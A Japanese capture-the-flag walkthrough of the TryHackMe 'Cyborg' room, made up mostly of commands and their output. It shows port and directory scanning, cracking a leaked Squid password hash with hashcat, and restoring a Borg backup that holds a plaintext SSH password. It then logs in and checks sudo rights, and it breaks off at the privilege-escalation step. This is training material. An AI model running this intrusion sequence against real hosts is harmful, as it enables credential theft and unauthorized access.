# Cyborg CTF

https://tryhackme.com/r/room/cyborgt8

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.200.116

root@ip-10-10-59-255:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-20 06:55 GMT
Nmap scan report for 10.10.200.116
Host is up (0.00024s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:73:DD:43:E4:87 (Unknown)

root@ip-10-10-59-255:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-20 06:56 GMT
Nmap scan report for 10.10.200.116
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:73:DD:43:E4:87 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP のみ。

Apache デフォルトページ。コメント特になし。

### gobuster

```shell
root@ip-10-10-59-255:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.200.116
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.200.116/admin/]
/etc                  (Status: 301) [Size: 312] [--> http://10.10.200.116/etc/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-59-255:~# gobuster dir -x php,txt,html -u http://$TARGET/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.200.116/admin
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 5771]
/admin.html           (Status: 200) [Size: 4926]
/.html                (Status: 403) [Size: 278]
Progress: 882228 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

admin/admin.html

```text
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
```

## archive.tar

メニューから、 http://10.10.200.116/admin/archive.tar をダウンロード

```shell
$ tar -xvf ./archive.tar
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1

$ ls -al
total 76
drwxrwxr-x 3 kali kali  4096 Dec 29  2020 .
drwxrwxr-x 3 kali kali  4096 Jan 20 02:02 ..
-rw------- 1 kali kali   964 Dec 29  2020 config
drwx------ 3 kali kali  4096 Dec 29  2020 data
-rw------- 1 kali kali    54 Dec 29  2020 hints.5
-rw------- 1 kali kali 41258 Dec 29  2020 index.5
-rw------- 1 kali kali   190 Dec 29  2020 integrity.5
-rw------- 1 kali kali    16 Dec 29  2020 nonce
-rw------- 1 kali kali    73 Dec 29  2020 README

$ cat ./config
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
        L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
        2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
        8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
        daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
        oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
        eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
        T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
        vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
        SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
        UCH8bjZLfc1GFsundmVyc2lvbgE=

$ cat README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

README から、borg というバックアップツールで作られたアーカイブらしい。

## passwd

http://10.10.200.116/etc/squid/passwd

```text
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

hashcat でパスワードを割れた。

```shell
hashcat -m 1600 hash.txt .\SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt

...
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```

問題は、何のパスワードか？

## borg

### アーカイブ一覧

```shell
$ borg list ./home/field/dev/final_archive
Enter passphrase for key /home/kali/CTF/home/field/dev/final_archive:
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

### アーカイブ内のコンテンツ一覧

```shell
 borg list ./home/field/dev/final_archive::music_archive
Enter passphrase for key /home/kali/CTF/home/field/dev/final_archive:
drwxr-xr-x alex   alex          0 Tue, 2020-12-29 08:55:52 home/alex
-rw-r--r-- alex   alex       3637 Mon, 2020-12-28 09:25:14 home/alex/.bashrc
-rw-r--r-- alex   alex        220 Mon, 2020-12-28 09:25:14 home/alex/.bash_logout
-rw-r--r-- alex   alex        675 Mon, 2020-12-28 09:25:14 home/alex/.profile
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 13:00:24 home/alex/Music
-rw------- alex   alex        439 Mon, 2020-12-28 12:26:45 home/alex/.bash_history
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.dbus
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.dbus/session-bus
-rw-r--r-- root   root        464 Mon, 2020-12-28 11:33:47 home/alex/.dbus/session-bus/c707f46991feb1ed17e415e15fe9cdae-0
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/ActionScript
-rw-r--r-- root   root       7046 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/ActionScript/ActionScript.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/AppleScript
-rw-r--r-- root   root       8934 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/AppleScript/AppleScript.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/ASP
-rw-r--r-- root   root       7254 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/ASP/ASP.sublime-syntax.cache
-rw-r--r-- root   root        640 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/ASP/HTML-ASP.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Batch File
-rw-r--r-- root   root       4850 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Batch File/Batch File.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/C#
-rw-r--r-- root   root        604 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/C#/Build.sublime-syntax.cache
-rw-r--r-- root   root      17237 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/C#/C#.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/C++
-rw-r--r-- root   root      11817 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/C++/C.sublime-syntax.cache
-rw-r--r-- root   root      15283 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/C++/C++.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Clojure
-rw-r--r-- root   root       2814 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Clojure/Clojure.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/CSS
-rw-r--r-- root   root      17947 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/CSS/CSS.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/D
-rw-r--r-- root   root      18692 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/D/D.sublime-syntax.cache
-rw-r--r-- root   root        287 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/D/DMD Output.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Diff
-rw-r--r-- root   root        806 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Diff/Diff.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Erlang
-rw-r--r-- root   root       5881 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Erlang/Erlang.sublime-syntax.cache
-rw-r--r-- root   root        257 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Erlang/HTML (Erlang).sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats
-rw-r--r-- root   root       1607 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Attributes.sublime-syntax.cache
-rw-r--r-- root   root       3096 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Commit.sublime-syntax.cache
-rw-r--r-- root   root       1314 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Common.sublime-syntax.cache
-rw-r--r-- root   root       1911 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Config.sublime-syntax.cache
-rw-r--r-- root   root        328 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Ignore.sublime-syntax.cache
-rw-r--r-- root   root        742 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Link.sublime-syntax.cache
-rw-r--r-- root   root        473 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Log.sublime-syntax.cache
-rw-r--r-- root   root       1342 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Git Formats/Git Rebase.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Go
-rw-r--r-- root   root       7366 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Go/Go.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Graphviz
-rw-r--r-- root   root       1506 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Graphviz/DOT.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Groovy
-rw-r--r-- root   root       5574 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Groovy/Groovy.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Haskell
-rw-r--r-- root   root       2859 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Haskell/Haskell.sublime-syntax.cache
-rw-r--r-- root   root        588 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Haskell/Literate Haskell.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/HTML
-rw-r--r-- root   root       5979 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/HTML/HTML.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Java
-rw-r--r-- root   root       9275 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Java/Java.sublime-syntax.cache
-rw-r--r-- root   root        909 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Java/Java Server Pages (JSP).sublime-syntax.cache
-rw-r--r-- root   root       1661 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Java/JavaDoc.sublime-syntax.cache
-rw-r--r-- root   root        575 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Java/JavaProperties.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript
-rw-r--r-- root   root      16252 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/JavaScript.sublime-syntax.cache
-rw-r--r-- root   root       1561 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/JSON.sublime-syntax.cache
-rw-r--r-- root   root       1294 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/JavaScript/Regular Expressions (JavaScript).sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX
-rw-r--r-- root   root       1079 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/Bibtex.sublime-syntax.cache
-rw-r--r-- root   root      10203 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX.sublime-syntax.cache
-rw-r--r-- root   root        668 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX Log.sublime-syntax.cache
-rw-r--r-- root   root       1788 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/LaTeX/TeX.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Lisp
-rw-r--r-- root   root       5115 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Lisp/Lisp.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Lua
-rw-r--r-- root   root       5353 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Lua/Lua.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Makefile
-rw-r--r-- root   root        234 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Makefile/Make Output.sublime-syntax.cache
-rw-r--r-- root   root       4762 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Makefile/Makefile.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Markdown
-rw-r--r-- root   root      11172 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Markdown/Markdown.sublime-syntax.cache
-rw-r--r-- root   root        393 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Markdown/MultiMarkdown.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Matlab
-rw-r--r-- root   root      26157 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Matlab/Matlab.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C
-rw-r--r-- root   root      25087 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C.sublime-syntax.cache
-rw-r--r-- root   root      15819 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C++.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/OCaml
-rw-r--r-- root   root        430 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/camlp4.sublime-syntax.cache
-rw-r--r-- root   root       6237 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCaml.sublime-syntax.cache
-rw-r--r-- root   root       1659 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCamllex.sublime-syntax.cache
-rw-r--r-- root   root       1623 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/OCaml/OCamlyacc.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Pascal
-rw-r--r-- root   root       1171 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Pascal/Pascal.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Perl
-rw-r--r-- root   root       8858 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/Perl/Perl.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/PHP
-rw-r--r-- root   root        447 Mon, 2020-12-28 11:33:47 home/alex/.config/sublime-text-3/Cache/PHP/PHP.sublime-syntax.cache
-rw-r--r-- root   root      32165 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/PHP/PHP Source.sublime-syntax.cache
-rw-r--r-- root   root       1248 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/PHP/Regular Expressions (PHP).sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Python
-rw-r--r-- root   root      17292 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Python/Python.sublime-syntax.cache
-rw-r--r-- root   root       1130 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Python/Regular Expressions (Python).sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/R
-rw-r--r-- root   root      14814 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/R/R.sublime-syntax.cache
-rw-r--r-- root   root        219 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/R/R Console.sublime-syntax.cache
-rw-r--r-- root   root       1177 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/R/Rd (R Documentation).sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rails
-rw-r--r-- root   root        427 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rails/HTML (Rails).sublime-syntax.cache
-rw-r--r-- root   root        388 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rails/JavaScript (Rails).sublime-syntax.cache
-rw-r--r-- root   root        985 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rails/Ruby Haml.sublime-syntax.cache
-rw-r--r-- root   root       1486 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rails/Ruby on Rails.sublime-syntax.cache
-rw-r--r-- root   root        304 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rails/SQL (Rails).sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Regular Expressions
-rw-r--r-- root   root       2985 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Regular Expressions/RegExp.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/RestructuredText
-rw-r--r-- root   root       1611 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/RestructuredText/reStructuredText.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Ruby
-rw-r--r-- root   root       9901 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Ruby/Ruby.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rust
-rw-r--r-- root   root        228 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rust/Cargo.sublime-syntax.cache
-rw-r--r-- root   root       8561 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Rust/Rust.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Scala
-rw-r--r-- root   root      13481 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Scala/Scala.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript
-rw-r--r-- root   root      10255 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/Bash.sublime-syntax.cache
-rw-r--r-- root   root       7668 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/commands-builtin-shell-bash.sublime-syntax.cache
-rw-r--r-- root   root        158 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/ShellScript/Shell-Unix-Generic.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/SQL
-rw-r--r-- root   root       2724 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/SQL/SQL.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/TCL
-rw-r--r-- root   root       1010 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/TCL/HTML (Tcl).sublime-syntax.cache
-rw-r--r-- root   root       4120 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/TCL/Tcl.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Cache/Text
-rw-r--r-- root   root         92 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.cache
-rw-r--r-- root   root         43 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.rcache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Textile
-rw-r--r-- root   root       1783 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Textile/Textile.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/XML
-rw-r--r-- root   root       2344 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/XML/XML.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/YAML
-rw-r--r-- root   root       3850 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/YAML/YAML.sublime-syntax.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Default
-rw-r--r-- root   root       4086 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Default/Syntax Summary.cache
-rw-r--r-- root   root      10895 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Default/Meta Info Summary.cache
-rw-r--r-- root   root    1003914 Mon, 2020-12-28 11:33:48 home/alex/.config/sublime-text-3/Cache/Default/Startup.cache
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Packages
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Packages/User
drwx------ root   root          0 Mon, 2020-12-28 11:38:24 home/alex/.config/sublime-text-3/Local
-rw-r--r-- root   root       5199 Mon, 2020-12-28 11:38:24 home/alex/.config/sublime-text-3/Local/Auto Save Session.sublime_session
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Lib
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Lib/python3.3
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/sublime-text-3/Installed Packages
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/ibus
drwx------ root   root          0 Mon, 2020-12-28 11:33:49 home/alex/.config/ibus/bus
drwxrwxr-x alex   alex          0 Tue, 2020-12-29 08:55:52 home/alex/Documents
-rw-r--r-- root   root        110 Tue, 2020-12-29 08:55:41 home/alex/Documents/note.txt
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 12:59:30 home/alex/Public
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 12:59:37 home/alex/Videos
drwxrwxr-x alex   alex          0 Tue, 2020-12-29 08:57:14 home/alex/Desktop
-rw-r--r-- root   root         71 Tue, 2020-12-29 08:57:14 home/alex/Desktop/secret.txt
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 12:59:57 home/alex/Downloads
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 13:00:02 home/alex/Templates
drwxrwxr-x alex   alex          0 Mon, 2020-12-28 13:26:44 home/alex/Pictures
```

### リストア

```shell
$ borg extract ./home/field/dev/final_archive::music_archive
Enter passphrase for key /home/kali/CTF/home/field/dev/final_archive:
```

### リストアしたコンテンツにアクセス

```shell
$ cd home/alex
$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

$ cat Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
alex:S3cretP@s3

$ cat Desktop/secret.txt
shoutout to all the people who have gotten to this stage whoop whoop!"
```

## SSH

入手したパスワードで SSH 接続できた。

```shell
$ ssh alex@10.10.200.116
The authenticity of host '10.10.200.116 (10.10.200.116)' can't be established.
ED25519 key fingerprint is SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.200.116' (ED25519) to the list of known hosts.
alex@10.10.200.116's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$
```

```shell
alex@ubuntu:~$ cat user.txt
flag{1_....}
```

ユーザーフラグゲット

## 権限昇格

### sudo

/etc/mp3backups/backup.sh を sudo で実行可能

```shell
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

### backup.sh

ファイルオーナーは alex

```shell
